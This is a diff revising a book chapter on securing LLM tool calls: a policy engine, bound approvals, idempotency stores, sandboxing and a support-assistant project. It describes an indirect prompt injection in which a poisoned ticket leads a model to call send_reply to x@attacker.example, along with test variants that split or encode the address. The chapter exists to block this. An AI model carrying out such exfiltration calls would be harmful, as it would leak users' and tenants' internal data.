-Everything above assumes your code runs the tool. As of 2026, several model APIs also offer tools the provider runs: web search, code execution in a provider-managed container, search over files you uploaded to the provider, and remote MCP connectors, where the provider's infrastructure calls an MCP server you name (Chapter 18 covers MCP itself). You enable them in the request. The model calls them mid-generation, the provider executes the call and feeds the result back into the same response, and you receive, at most, a record of what was called and what came back.
+> **Deep dive.** Tools the provider runs and the controls they bypass; skip on a first reading.
 
-That changes who holds each control. None of these calls passes through `ToolExecutor`, so:
+As of 2026, several model APIs offer tools the provider runs mid-generation: web search, code execution, search over uploaded files, and remote MCP connectors (Chapter 18). You receive at most a record of each call, and none passes through `ToolExecutor`:
 
-- **Policy.** No argument validation, permission check, or argument rule of yours runs. Your levers are coarse: whether the tool is enabled for this request, and whatever configuration the provider exposes, such as a domain allowlist for search or an allowlist of connector tools.
-- **Audit.** You learn about the call after it happened, from the response. Nothing in your audit log exists unless you copy the provider's record of each call into it, as a distinct event type so that "observed" is never confused with "authorized".
-- **Data egress.** A search query is derived from the conversation and can carry internal data out; a fetched URL is a data channel, exactly as in the sandboxing section. Code execution uploads its inputs to the provider's container. A remote connector sends arguments from the provider's network to a third party, so your network egress allowlist never sees the traffic.
-- **Approval.** Your approval gate cannot interpose in a call the provider runs inside one generation. Some providers offer an approval mode for connectors that returns control to you before the call; anything that writes must use it or not be enabled.
-- **Injection.** Search results and fetched pages enter the context in the same turn and are as untrusted as a ticket body.
+- **Policy.** None of your rules run. Your levers are whether the tool is enabled for this request and provider settings such as a search domain allowlist.
+- **Audit.** You learn of the call afterwards. Copy the provider's record into your audit log as a distinct event type, so "observed" is never confused with "authorized".
+- **Data egress.** A search query can carry conversation data out, code execution uploads its inputs, and a remote connector reaches a third party past your egress allowlist.
+- **Approval.** Your gate cannot interpose. Anything that writes must use a provider approval mode that returns control before the call, or stay disabled.
+- **Injection.** Fetched pages are as untrusted as a ticket body.
 
-When are they worth it? When the capability is read-only, the data it sends out is no more sensitive than what the provider already receives in the prompt, and building it yourself buys nothing: web search for public documentation, or arithmetic on numbers already in the conversation. Do not enable them for any write, for regulated data, or in a session that has already read confidential or tenant data. That last case recreates the exfiltration path from the side-effect classes section: a sensitive read plus an outbound channel, with no recipient allowlist in between.
-
-Treat enabling a hosted tool as a policy decision made in code per request, from the same trusted context as `ToolRegistry.select`, never as a static setting on the client. When you need argument-level policy, idempotency, or your own audit trail, implement the capability as an ordinary tool instead: a `fetch_url` with an egress allowlist (exercise P3) or `SandboxRunner` behind your executor.
+Use them for read-only work that sends out nothing more sensitive than the prompt, such as searching public documentation. Never enable them for writes, regulated data, or a session that has read confidential or tenant data, which recreates the exfiltration path. Decide enablement in code per request from trusted context; when you need your own controls, build an ordinary tool, such as a `fetch_url` with an egress allowlist (exercise P3).
 
 ## How it works
 
-Start with the call this chapter is built to stop. A model that read a poisoned ticket calls `send_reply(to="x@attacker.example", ...)`. Validation passes, because the arguments are well formed. Policy denies the call on the `recipient_allowlist` rule, so no approval request is created and no handler runs. An audit event records the rule that decided. The steps below show where each of those decisions happens.
+Start with the call this chapter is built to stop. A model that read a poisoned ticket calls `send_reply(to="x@attacker.example", ...)`. Validation passes, because the arguments are well formed. Policy denies the call on the `recipient_allowlist` rule, so no approval request is created, no handler runs, and an audit event records the rule.
 
-Follow one call from the model through `ToolExecutor.execute`. The order is fixed, and each step can end the call with a classified result.
+`ToolExecutor.execute` runs a fixed sequence; each step can end the call with a classified result.
 
-1. **Lookup.** An unknown name returns `not_found` with the list of available tools, so the model can correct a typo.
-2. **Validation.** The raw arguments are validated against the args model; unknown fields are rejected. Failure returns `validation` with field-level problems. The normalized arguments are hashed.
-3. **Policy.** Permission, group denies, tenant scope, argument rules, rate limit, then the approval requirement, in that order. A denial returns `permission` (or `transient` with `retry_after_s` for a rate limit). Denied calls consume no rate budget and create no approval request, so an attacker cannot flood the approval queue with forbidden calls. An approval-gated call pays its rate budget once, when it is proposed; executing the approved call does not charge it again.
-4. **Idempotency peek.** For non-idempotent tools with a store, the key is computed and looked up. A succeeded record returns its result marked `duplicate`; an in-progress record returns `transient`; an unknown record triggers reconcile or returns `fatal`.
-5. **Approval.** If the policy said approval is needed and no approval id came with the call, a request is created and the call returns `pending_approval`, telling the model the action has not happened. With an approval id, `verify` must pass.
+1. **Lookup.** An unknown name returns `not_found` listing the available tools.
+2. **Validation.** Arguments are validated against the args model, unknown fields rejected; failure returns `validation` with field-level problems. The normalized arguments are hashed.
+3. **Policy.** Permission, group denies, tenant scope, argument rules, rate limit, then the approval requirement. A denial returns `permission` (or `transient` with `retry_after_s` for a rate limit). An approval-gated call pays its rate budget once, when proposed.
+4. **Idempotency peek.** For non-idempotent tools with a store, the key is looked up. A succeeded record returns its result marked `duplicate`; in-progress returns `transient`; unknown triggers reconcile or returns `fatal`.
+5. **Approval.** If approval is needed and none came with the call, a request is created and the call returns `pending_approval` (the action has not happened). With an approval id, `verify` must pass.
 6. **Reservation.** The key is reserved atomically (`begin`). A lost race is handled like step 4.
-7. **Run.** The handler runs in a worker with the tool's timeout. Transient errors are retried with backoff; classified errors release the reservation; a timeout on a write marks it unknown.
+7. **Run.** The handler runs with the tool's timeout. Transient errors are retried with backoff; classified errors release the reservation; a timeout on a write marks it unknown.
 8. **Record.** The result is stored under the key, the approval consumed, the payload truncated for the model, and `tool.executed` emitted.
 
-`ToolLoop` wraps this in the Chapter 3 protocol. Each round it sends the specs visible to this user and task, appends the assistant message verbatim, executes each call through the executor, and appends one tool message per call. Its guards:
+The order is a security property. Permission comes first so a forbidden tool reveals nothing else. Argument rules precede the rate limit so denied calls do not spend budget legitimate calls need. Approval comes last so only otherwise-allowed calls reach a human, and nobody can flood the queue with forbidden ones. The idempotency peek precedes the approval gate because returning a recorded result causes no new effect and needs no new approval; that makes `execute_approved` replay-safe. Reservation follows the gate, so a pending approval never holds a key.
 
-- it refuses to execute a tool that was not offered;
+`ToolLoop` wraps this in the Chapter 3 protocol: each round it sends the specs visible to this user and task, appends the assistant message verbatim, executes each call, and appends one tool message per call. Its guards:
+
+- it refuses to execute a tool that was not offered (policy would deny it anyway; this is defense in depth);
 - it caps calls per round;
 - it stops on an identical call repeated too often, and on `outcome_unknown`;
-- when any call returned `pending_approval`, it makes one more model call with `tool_choice="none"`, so the model tells the user the action is waiting instead of trying alternatives, and returns with stop reason `pending_approval`; this text-only turn can take the loop one round past `max_rounds`.
+- after any `pending_approval`, it makes one more model call with `tool_choice="none"` so the model tells the user the action is waiting, then stops with reason `pending_approval` (this can take the loop one round past `max_rounds`).
 
-Chapter 19 grows this loop into a full agent runtime that still calls tools through `executor.bind(ctx)`, so every call traverses this same pipeline.
+Chapter 19 grows this loop into an agent runtime that still calls tools through `executor.bind(ctx)`, so every call traverses this pipeline.
 
 ## Architecture
 
-The first diagram shows the trust boundaries. Everything the model produces, and everything that arrives from tickets, documents, or tool results, is untrusted. Identity enters only from the authenticating gateway. Approval decisions enter only through their own endpoint.
+> **Deep dive.** Trust boundaries, approval sequence, and idempotency states as diagrams; skip on a first reading.
+
+The first diagram shows the trust boundaries. Everything the model produces, and everything from tickets, documents, or tool results, is untrusted. Identity enters only from the authenticating gateway; approval decisions only through their own endpoint.
 
 ```mermaid
 flowchart LR
@@ -285,7 +268,7 @@ flowchart LR
     H -->|"truncated result"| LOOP
 ```
 
-The second diagram shows the approval sequence for `send_reply`. Note where the arguments are fixed: at the moment the request is created, before any human sees it, and they never pass through the model again.
+The second diagram shows the approval sequence for `send_reply`. The arguments are fixed when the request is created and never pass through the model again.
 
 ```mermaid
 sequenceDiagram
@@ -315,7 +298,7 @@ sequenceDiagram
     E-->>S: ok
 ```
 
-The third diagram is the idempotency record's state machine. The `unknown` state is the one that keeps the harness honest: it exists so that "we do not know" is represented instead of being rounded to "failed" and retried.
+The third diagram is the idempotency record's state machine. The `unknown` state keeps the harness honest: "we do not know" is represented instead of being rounded to "failed" and retried.
 
 ```mermaid
 stateDiagram-v2
@@ -331,7 +314,7 @@ stateDiagram-v2
 
 ## Implementation
 
-The listings below are excerpts that carry the ideas; the full files, with docstrings, helpers, and tests, are on disk.
+The listings below are excerpts; the full files, with docstrings, helpers, and tests, are on disk.
 
 ```
 book/projects/toolkit/
@@ -352,11 +335,11 @@ book/projects/p4-support-assistant/
   tests/              test_scenarios.py  test_api.py
 ```
 
-`toolkit` depends only on `aie_core` and pydantic. Install it as a path dependency (`toolkit = { path = "../toolkit", editable = true }` under `[tool.uv.sources]`, or `pip install -e ../toolkit`). It has no environment configuration of its own: where approvals, idempotency records, and audit events live is the application's decision, passed to constructors. Project 4's configuration is in the table at the end of this section.
+`toolkit` depends only on `aie_core` and pydantic; install it as a path dependency (`pip install -e ../toolkit`). It has no environment configuration of its own: the application passes the approval, idempotency, and audit stores to constructors.
 
 ### The tool definition and registry
 
-Every later chapter builds on these names. The excerpt shows the side-effect classes, the governed fields of `Tool`, what the model sees, the action hash, and per-user filtering. Name and description validation in `__post_init__` and the decorator form of registration are on disk.
+Every later chapter builds on these names: the side-effect classes, the governed fields of `Tool`, what the model sees, the action hash, and per-user filtering. `__post_init__` (on disk) rejects names providers would reject and empty descriptions.
 
 ```python
 # path: book/projects/toolkit/toolkit/registry.py (excerpt; full file on disk)
@@ -428,11 +411,11 @@ class ToolRegistry:
 
 ### Errors
 
-`errors.py` (on disk) defines `ErrorCategory` with the five values from the error-contract table and `ToolError`, an exception carrying `category`, `code`, a model-facing `message`, optional `retry_after_s`, and `details`. Its `retryable` property is true only for `transient`, and convenience constructors (`ToolError.validation(...)`, `ToolError.transient(...)`, and so on) keep the codes consistent across handlers. `to_dict()` produces the `error` object of the JSON envelope the model reads.
+`errors.py` (on disk) implements the error contract: `ToolError` is `retryable` only for `transient`, and one constructor per category (`ToolError.validation(...)`) keeps handler codes consistent.
 
 ### The policy engine
 
-`ToolContext` (on disk) is a frozen pydantic model of the authenticated principal: `user_id`, `tenant`, `groups`, `scopes`, `session_id`, `request_id`, and trusted `attributes`. `evaluate` is the core of the file (a local `decide` helper, elided, wraps the verdict, reasons, and rule ids into a `Decision`); the configuration methods (`add_rule`, `deny_tool_for_group`, `set_rate_limit`) and the reusable constraints are on disk.
+`ToolContext` (on disk) is a frozen model of the authenticated principal (`user_id`, `tenant`, `groups`, `scopes`, session and request ids). `evaluate` applies the policy order from How it works; an elided `decide` helper wraps the verdict, reasons, and rule ids into a `Decision`.
 
 ```python
 # path: book/projects/toolkit/toolkit/policy.py (excerpt; full file on disk)
@@ -485,7 +468,7 @@ def evaluate(self, tool: Tool, args: BaseModel, ctx: ToolContext, *, consume: bo
 
 ### Approvals
 
-A request stores the validated arguments and their hash; `verify` checks tool, hash, principal, status, and expiry.
+`verify` is the check described in Human approval bound to concrete arguments; each failure raises `ApprovalError` with a specific code such as `approval_mismatch`.
 
 ```python
 # path: book/projects/toolkit/toolkit/approval.py (excerpt; full file on disk)
@@ -515,7 +498,9 @@ def consume(self, request_id: str) -> None:
 
 ### Idempotency store
 
-The protocol is five methods; `begin` is the one that matters, because it must be atomic. The in-memory version shows the semantics, including the lease that turns an abandoned reservation into `unknown`. The SQLite store on disk implements the same protocol with a primary key and `BEGIN IMMEDIATE`, so `begin` is atomic across threads and processes sharing the file, and its SQL ports to PostgreSQL as `INSERT ... ON CONFLICT DO NOTHING`.
+> **Deep dive.** The atomic reservation in code; skip on a first reading.
+
+The protocol is five methods; `begin` matters most, because it must be atomic. The in-memory version shows the semantics, including the lease. The SQLite store on disk uses a primary key and `BEGIN IMMEDIATE`, so `begin` is atomic across processes sharing the file; its SQL ports to PostgreSQL as `INSERT ... ON CONFLICT DO NOTHING`.
 
 ```python
 # path: book/projects/toolkit/toolkit/idempotency.py (excerpt; full file on disk)
@@ -554,7 +539,9 @@ class InMemoryIdempotencyStore:
 
 ### The executor
 
-The executor is the longest file in the package. Two methods carry the design: `_execute`, the fixed pipeline from How it works, and `_run`, the retry and timeout rules. `_handle_existing` (on disk) decides what an existing idempotency record means: a different argument hash is `idempotency_key_reused`, `succeeded` returns the stored result marked duplicate, `in_progress` is transient, and `unknown` calls the tool's `reconcile` or returns `outcome_unknown`. `_approval_gate`, result construction, auditing helpers, and `BoundTool` are also on disk.
+> **Deep dive.** The pipeline and retry rules in code; skip on a first reading.
+
+Two methods carry the design: `_execute`, the fixed pipeline from How it works, and `_run`, the retry and timeout rules. `_handle_existing` (on disk) maps an existing record to the step 4 outcomes, plus `idempotency_key_reused` when the argument hash differs. A store outage fails closed before anything runs.
 
 ```python
 # path: book/projects/toolkit/toolkit/executor.py (excerpt; full file on disk)
@@ -660,7 +647,9 @@ def _run(self, tool: Tool, args: BaseModel, call: ToolCall, ctx: ToolContext, h:
 
 ### The sandbox
 
-`SandboxRunner.run` (on disk) creates the temporary working directory, refuses file inputs whose resolved path escapes it, prefixes the command with `unshare --net` when `network="deny"`, starts the child in its own session with stdout and stderr redirected to files, and on timeout kills the whole process group. `run_python` adds `-I -B`. The two functions below are what the child inherits: an environment built from an allowlist, and kernel limits applied between fork and exec.
+> **Deep dive.** What the sandboxed child inherits; skip on a first reading.
+
+`SandboxRunner.run` (on disk) implements the list in the sandboxing section. The two functions below decide what the child inherits: an environment built from an allowlist, and kernel limits applied between fork and exec. A limit the kernel rejects is skipped, because the wall-clock timeout still applies.
 
 ```python
 # path: book/projects/toolkit/toolkit/sandbox.py (excerpt; full file on disk)
@@ -688,7 +677,9 @@ def _apply_limits(self) -> None:  # runs in the child between fork and exec
 
 ### The tool-calling loop
 
-The loop is the Chapter 3 protocol plus the guards listed in How it works. Setup (visible specs, the `allowed` set, counters) and the model call are on disk; the excerpt is the per-call body of one round.
+> **Deep dive.** The loop guards in code; skip on a first reading.
+
+The excerpt is the per-call body of one round; `allowed` is the set of tool names sent this run. Setup and the model call are on disk.
 
 ```python
 # path: book/projects/toolkit/toolkit/loop.py (excerpt; full file on disk)
@@ -723,7 +714,7 @@ The loop is the Chapter 3 protocol plus the guards listed in How it works. Setup
 
 ### Project 4: the Northwind support tools
 
-The tools file is where application knowledge meets the harness: argument contracts with descriptions that decide, handlers that scope by tenant, and a policy that encodes Northwind's rules. The excerpt shows the `send_reply` contract, handler, and reconcile function, one of the six registrations, and the policy builder. The other args models, handlers, and the remaining registrations (`lookup_employee`, `search_tickets`, `get_service_status` as reads; `create_ticket` and `draft_reply` as non-idempotent reversible writes with a `reconcile` for `create_ticket`) are on disk.
+The excerpt shows the `send_reply` contract, handler, reconcile function, and registration, plus the policy builder. On disk, `lookup_employee`, `search_tickets`, and `get_service_status` are reads; `create_ticket` and `draft_reply` are non-idempotent reversible writes. Handlers scope by `ex.tenant`, writes pass `ex.idempotency_key` downstream, and `create_ticket` also has a `reconcile`.
 
 ```python
 # path: book/projects/p4-support-assistant/support_assistant/tools.py (excerpt; full file on disk)
@@ -768,7 +759,7 @@ def build_policy(settings: AssistantSettings) -> PolicyEngine:
     return policy
 ```
 
-The application service owns sessions and the approval channel. Approving runs exactly the stored action as the *requester*, not as the approver, because the action is taken on the requester's behalf and must be authorized as such. `reject` (on disk) records the decision and a note in the conversation without running anything.
+The application service owns sessions and the approval channel. Approving runs exactly the stored action as the *requester*, not the approver, because it is authorized on the requester's behalf.
 
 ```python
 # path: book/projects/p4-support-assistant/support_assistant/assistant.py (excerpt; full file on disk)
@@ -782,7 +773,7 @@ def approve(self, approval_id: str, approver_id: str, note: str | None = None) -
     return result
 ```
 
-The injection test is the one to read first. It scripts a model that has been fully persuaded by the poisoned ticket and checks that the effect is blocked anyway.
+The injection test is the one to read first. It scripts a model fully persuaded by the poisoned ticket and checks that the effect is blocked anyway. `search_tickets` labels requester text as data, but the test does not rely on that label.
 
 ```python
 # path: book/projects/p4-support-assistant/tests/test_scenarios.py (excerpt; full file on disk)
@@ -810,11 +801,9 @@ def test_indirect_injection_in_ticket_cannot_exfiltrate(make_assistant):
 
 | Variable | Default | Meaning |
 |---|---|---|
-| `LLM_PROVIDER`, `LLM_MODEL`, provider keys | `fake` | model settings from `aie_core` (Chapter 3) |
-| `P4_SHARED_DATA_DIR` | `../shared-data` | location of `shared_data.py` and `tickets.jsonl` |
-| `P4_EXTRA_TICKETS_PATH` | `data/injected_tickets.jsonl` | local ticket fixtures, including the injection fixture |
-| `P4_ALLOWED_RECIPIENT_DOMAINS` | `["northwind.example"]` | recipient allowlist for drafts and sends |
-| `P4_ALLOWED_RECIPIENTS` | `[]` | individually allowed external addresses |
+| `LLM_PROVIDER`, `LLM_MODEL`, provider keys | `fake` | model settings (Chapter 3) |
+| `P4_SHARED_DATA_DIR`, `P4_EXTRA_TICKETS_PATH` | `../shared-data`, `data/injected_tickets.jsonl` | shared data and local ticket fixtures, including the injection fixture |
+| `P4_ALLOWED_RECIPIENT_DOMAINS`, `P4_ALLOWED_RECIPIENTS` | `["northwind.example"]`, `[]` | recipient allowlist for drafts and sends |
 | `P4_APPROVAL_TTL_S` | `900` | approval expiry in seconds |
 | `P4_FOUR_EYES` | `false` | forbid approving your own send |
 | `P4_IDEMPOTENCY_DB` | `:memory:` | SQLite file for duplicate suppression across restarts |
@@ -834,93 +823,86 @@ docker build -f p4-support-assistant/Dockerfile -t northwind/support-assistant .
 docker run --rm -p 8000:8000 -v p4-state:/app/state northwind/support-assistant
 ```
 
-With `LLM_PROVIDER=fake` the service uses a keyword-driven demo model (`adapters/demo_llm.py`) so you can exercise the harness from curl without a key: ask for the VPN status, ask it to send a reply to an internal address and approve it as `sam`, then ask it to send to an outside address and watch the policy refuse.
+With `LLM_PROVIDER=fake` a keyword-driven demo model lets you exercise the harness from curl without a key: ask for the VPN status, send a reply to an internal address and approve it as `sam`, then send to an outside address and watch the policy refuse.
 
 ## Code walkthrough
 
-**The `Tool` object is the contract.** Making side effect, permission, timeout, idempotency, approval, and result limit fields of a frozen dataclass means a tool cannot be registered without answering every question the harness asks. `__post_init__` (on disk) rejects names outside `[A-Za-z0-9_-]{1,64}`, which providers would reject, and empty descriptions the model cannot select by. `json_schema()` closes the object, and the executor enforces the closure by rejecting unknown fields, so the schema the model reads and the check the code applies agree.
+How it works explains the policy order and Retries and error contracts explains `_run`; two details remain.
 
-**`args_hash` is the identity of an action.** It is computed over the canonical JSON of the tool name and the normalized arguments, after pydantic has validated and coerced them. Approvals, idempotency keys, and audit events all use it, which is what lets them refer to the same thing; the loop's repeated-call detector uses the same function over the raw arguments, before validation.
+**Closure is enforced, not just declared.** `json_schema()` sets `additionalProperties: false`, and `_execute` rejects unknown fields with `_unknown_fields`, so the schema the model reads and the check the code applies agree.
 
-**Policy order is a security property.** Permission comes first so that a forbidden tool reveals nothing else. Argument rules come before the rate limit so that forbidden calls do not consume budget that legitimate calls need. Approval comes last so that only calls that would otherwise be allowed reach a human. Reverse any pair and you get a concrete bug: approvals created for calls the user could never make, or a rate limit an attacker exhausts with denied calls.
-
-**The idempotency peek precedes the approval gate.** If the identical action already succeeded, returning its recorded result is safe without a new approval, because no new effect occurs. That ordering is what makes `execute_approved` replay-safe: the second execution of a consumed approval returns the recorded result instead of failing confusingly or, worse, sending again. Reservation (`begin`) happens after the gate, so a pending approval never holds a key.
-
-**`_run` encodes the retry rules.** A `ToolError` from the handler is trusted to mean "the effect did not happen", so the reservation is released and a transient one is retried. A timeout is not trusted that way: idempotent tools retry, non-idempotent ones become `outcome_unknown`. An unexpected exception is a bug and also marks writes unknown. The backoff uses the error's `retry_after_s` when present and full jitter otherwise.
-
-**The loop never executes what it did not offer.** `allowed` is the set of names in the specs sent this run. A model that names `send_reply` when it was filtered out gets a `tool_not_available` result, the executor is never called, and no approval is created. Defense in depth: even if this check were removed, the executor's policy would deny.
-
-**Project 4's handlers authorize data as well as tools.** In the handlers on disk, `lookup_employee` filters by `ex.tenant` and returns `public_view()`. `create_ticket` and `send_reply` pass `ex.idempotency_key` to the store and the outbox, and each has a `reconcile` that looks the key up, so an unknown outcome resolves itself on the next attempt. `search_tickets` labels requester text as data in the result; that label helps the model but is not relied on, which is exactly what the injection test demonstrates.
-
+**Two hashes, one function.** The executor hashes *normalized* arguments, so approvals and idempotency see one action per meaning. The loop's repeated-call detector hashes *raw* arguments, so it also catches a repeated invalid call.
 
 ## Production considerations
 
-**Latency.** Each tool round is a full model call plus tool execution, so a three-round answer costs three model latencies. Two habits keep it down. Let the model issue independent calls in one turn (status and ticket search together, as in the happy-path test). `ToolLoop` executes them in order, which is simple to reason about; because the executor is thread-safe, running the read-only calls of one turn concurrently is a small extension that cuts a round's tool time to its slowest call. And set per-tool timeouts from measured p99 latencies, not round numbers: a 30-second timeout on a tool whose p99 is 400 ms turns a hung dependency into a 30-second user wait. Approval adds human latency measured in minutes; design the conversation so the user is told the action is pending and can leave, rather than holding a request open.
+> **Deep dive.** Latency, cost, alerts, outages, and replicas; skip on a first reading.
 
-**Cost.** Tool specs are input tokens on every round. Filter the menu per task, keep descriptions tight, and cap results with `max_result_chars`: a 6,000-character result is roughly 1,500 tokens (illustrative) re-sent on every later round of the conversation. Watch the rounds-per-conversation distribution; a tail of conversations with eight or more rounds usually means a tool returns errors the model cannot interpret or results it cannot use.
+**Latency.** Each round is a full model call plus tool execution. Let the model issue independent calls in one turn; the thread-safe executor can run one turn's reads concurrently. Set timeouts from measured p99 latency: a 30-second timeout on a tool whose p99 is 400 ms turns a hung dependency into a 30-second wait. Tell the user an approval is pending rather than holding a request open.
 
-**Security.** The controls in this chapter are the tool-layer half of Chapter 26's threat model and feed Chapter 27's guardrails. In deployment, add: credentials per tool with the narrowest scope, rotated and never in the model context; egress allowlists at the network layer for anything that fetches or sends, so a bug in the policy is not the last line; tenant isolation tested as aggressively as for retrieval (Chapter 15); and review of tool descriptions and policy changes as code, because both change behavior. Store approvals, idempotency records, and audit events in durable storage with the same access controls as the systems the tools touch. The in-memory implementations are correct for one process and tests only.
+**Cost.** A 6,000-character result is roughly 1,500 tokens (illustrative), re-sent on each later round. A tail of conversations with eight or more rounds usually means a tool returns errors or results the model cannot use.
 
-**Operations.** Emit metrics from the audit stream: calls per tool, error rate by category and code, denials by rule, approval requests, approval latency and rejection rate, duplicates suppressed, `outcome_unknown` count, truncation rate, and p95 latency per tool. Alert on `outcome_unknown` and `idempotency_unavailable` (each needs a human; page), on a jump in `policy_denied` for an external tool (often an injection campaign or a broken prompt; for example, above three times its seven-day baseline in an hour), and on validation errors after a deploy (a schema or description regression; for example, above 5% of one tool's calls within an hour, which should roll the deploy back). These thresholds are illustrative; tune them from your baseline. Keep a runbook for reconciling unknown outcomes: query the downstream system by idempotency key, then complete or release the record. Version the policy (`PolicyEngine(version=...)`) and the tool schemas so every audit event says which rules decided it.
+**Security.** These controls are the tool-layer half of Chapter 26's threat model and feed Chapter 27's guardrails. Add network-layer egress allowlists so a policy bug is not the last line, and test tenant isolation as for retrieval (Chapter 15).
 
-**Degraded modes.** Decide in advance what each dependency's outage means, and make the executor's behavior match. Three dependencies need a written answer. *The idempotency store*: if it is unreachable, `ToolExecutor` fails closed for non-idempotent tools, returning a `transient` error with code `idempotency_unavailable`, emitting `tool.failed`, and never running the handler, because a write without duplicate suppression is exactly the incident this chapter exists to prevent. Reads do not touch the store and keep working, so the assistant degrades to read-only rather than going down. *The approval manager*: if none is configured, approval-gated tools are denied (`approval_unavailable`), never auto-approved; a remote approval store you add must fail the same way. *The audit sink*: `toolkit`'s sinks are local (memory or a JSONL file), but if you replace them with a remote sink, the safe choice for external tools is to refuse while it is down, since an unaudited send is an uninvestigable one; for reads, buffer events locally and alert. Write each of these down in the runbook with the alert that detects it.
+**Operations.** Emit metrics from the audit stream (calls, errors by code, denials by rule, approval latency and rejections, duplicates suppressed, truncation rate, p95 latency per tool). Page on `outcome_unknown` and `idempotency_unavailable`. Alert on a jump in `policy_denied` for an external tool (often an injection campaign; for example, three times its seven-day baseline in an hour) and on validation errors after a deploy (for example, above 5% of one tool's calls in an hour, which should roll back). These thresholds are illustrative. To resolve an unknown outcome, query the downstream system by idempotency key, then complete or release the record. Version the policy (`PolicyEngine(version=...)`) so audit events name the rules that decided.
 
-**Tracing.** The executor wraps every call in a `tool.execute` span carrying `tool.status`, `tool.duplicate`, `tool.attempts`, and `tool.error_category`, and `ToolLoop` adds a `tool_loop.round` span per model round; with Chapter 31's tracer these nest under the request span, so one trace shows the model round, the policy decision, and the downstream latency of each call.
+**Degraded modes.** With the idempotency store unreachable, the executor refuses non-idempotent tools (`idempotency_unavailable`) while reads keep working, so the assistant degrades to read-only. With no approval manager, gated tools are denied (`approval_unavailable`), never auto-approved. A remote audit sink should block external tools while it is down: an unaudited send cannot be investigated.
 
-**Multi-replica deployment.** Idempotency only works if every replica shares the store. The SQLite store is safe for processes on one host sharing a file; across hosts, use the same schema in PostgreSQL or a Redis `SET NX` with expiry. Rate limits in `PolicyEngine` are per process; for a global limit, back `_check_rate` with Redis. Approvals must live in a shared store so that whichever replica receives the approval request can find it.
+**Tracing.** The executor emits a `tool.execute` span per call and `ToolLoop` a `tool_loop.round` span per round; Chapter 31 covers how they nest under the request trace.
+
+**Multi-replica deployment.** Every replica must share the idempotency store. SQLite is safe for processes on one host; across hosts, use the same schema in PostgreSQL or a Redis `SET NX` with expiry. `PolicyEngine` rate limits are per process; back `_check_rate` with Redis for a global limit. Approvals need a shared store too.
 
 ## Common mistakes
 
-- **Letting the model's output be the authorization.** "The model only calls `send_reply` when appropriate" is not a control. The policy engine decides from trusted context; the model's choice is an input.
-- **Retrying everything.** Retrying permission and validation errors wastes rounds; retrying writes after timeouts creates duplicates.
-- **Free-text errors.** `"Error: something went wrong"` gives the model nothing to act on, so it retries the same call or apologizes. Return category, code, and a message that says what to do.
-- **Unbounded results.** Returning a whole table or document fills the context, raises cost on every later round, and widens the injection surface. Bound and announce truncation.
-- **Tool descriptions as an afterthought.** Copying the function docstring yields descriptions written for programmers. Write them for the selection decision, including when not to use the tool.
+- **Letting the model's output be the authorization.** "The model only calls `send_reply` when appropriate" is not a control; the model's choice is an input to policy.
+- **Free-text errors.** `"Error: something went wrong"` leaves the model to retry the same call or apologize. Return category, code, and what to do.
+- **Tool descriptions as an afterthought.** A copied docstring is written for programmers; write for the selection decision, including when not to use the tool.
 - **Logging full arguments everywhere.** Audit logs become the largest store of personal data in the company. Log hashes; keep full arguments in the system of record.
 
 ## Failure modes
 
-**Exfiltration through an external tool.** Symptom: a `send_reply`, fetch, or webhook call to an unfamiliar destination carrying internal data, usually in a conversation that read external or user-written content. Telemetry: `tool.denied` with rule `recipient_allowlist` and the same session containing a search or retrieval just before; without the allowlist, a `tool.executed` to a new domain. Test: Project 4's injection test, plus variants with the address split across fields, encoded, or placed in a URL parameter.
+**Exfiltration through an external tool.** Symptom: a send, fetch, or webhook call to an unfamiliar destination carrying internal data, usually after reading external content. Telemetry: `tool.denied` with rule `recipient_allowlist`, preceded in the same session by a search or retrieval; without the allowlist, a `tool.executed` to a new domain. Test: Project 4's injection test, plus variants with the address split across fields, encoded, or placed in a URL parameter.
 
-**Duplicate side effects.** Symptom: two tickets or two emails with identical content seconds apart. Telemetry: two `tool.executed` events with the same `args_hash` and no `tool.duplicate_suppressed`; often a gateway retry or a resumed loop between them. Cause: tool marked idempotent when it is not, no store configured, a store not shared across replicas, or a key that includes something volatile such as a timestamp. Test: execute the same call twice and across two executor instances sharing the store.
+**Duplicate side effects.** Symptom: two tickets or emails with identical content seconds apart. Telemetry: two `tool.executed` events with the same `args_hash` and no `tool.duplicate_suppressed`, often with a gateway retry or resumed loop between them. Cause: a tool wrongly marked idempotent, no store, an unshared store, or a key containing something volatile such as a timestamp. Test: execute the same call twice, and across two executor instances sharing the store.
 
-**Unknown outcomes piling up.** Symptom: users report messages "stuck"; the model says it cannot confirm. Telemetry: `tool.failed` with `outcome_unknown`, clustered on one tool, often with latency near its timeout. Cause: a downstream slowdown pushing calls past a timeout set too tight, or a tool without `reconcile`. Fix the timeout from measured latency and add reconcile.
+**Unknown outcomes piling up.** Symptom: users report messages "stuck". Telemetry: `tool.failed` with `outcome_unknown`, clustered on one tool, latency near its timeout. Cause: a downstream slowdown past a tight timeout, or a tool without `reconcile`. Set the timeout from measured latency and add reconcile.
 
-**Selection drift.** Symptom: after a deploy, the model stops checking status before creating tickets, or calls the wrong search. Telemetry: tool-call mix per conversation shifts; validation errors rise for one tool; `tool_fingerprint` in audit events changed at the deploy. Cause: a description edit, a new overlapping tool, or a model change. Test: the selection evaluation set run in CI.
+**Selection drift.** Symptom: after a deploy, the model stops checking status before creating tickets. Telemetry: the tool-call mix shifts, validation errors rise for one tool, and `tool_fingerprint` changed at the deploy. Cause: a description edit, an overlapping tool, or a model change. Test: the selection set in CI.
 
-**Repair loops.** Symptom: the same tool called four or five times with slightly different invalid arguments. Telemetry: consecutive `tool.invalid` events for one call site, the loop ending on `max_rounds` or `repeated_call`. Cause: an error message that does not say which field is wrong or what is allowed, or a schema constraint the description does not mention. Fix the error details and the description together.
+**Repair loops.** Symptom: one tool called repeatedly with slightly different invalid arguments. Telemetry: consecutive `tool.invalid` events, ending on `max_rounds` or `repeated_call`. Cause: an error that does not say which field is wrong, or a constraint the description omits. Fix both together.
 
-**Approval fatigue.** Symptom: approval latency drops to seconds and rejection rate to zero while incidents involving approved actions appear. Telemetry: approval decision time distribution and rejection rate per approver. Cause: too many low-risk actions routed to approval. Move reversible actions out of the approval class and make summaries informative.
+**Approval fatigue.** Symptom: approval latency drops to seconds and rejections to zero while incidents involving approved actions appear. Telemetry: decision time and rejection rate per approver. Cause: too many low-risk actions routed to approval; move reversible ones out.
 
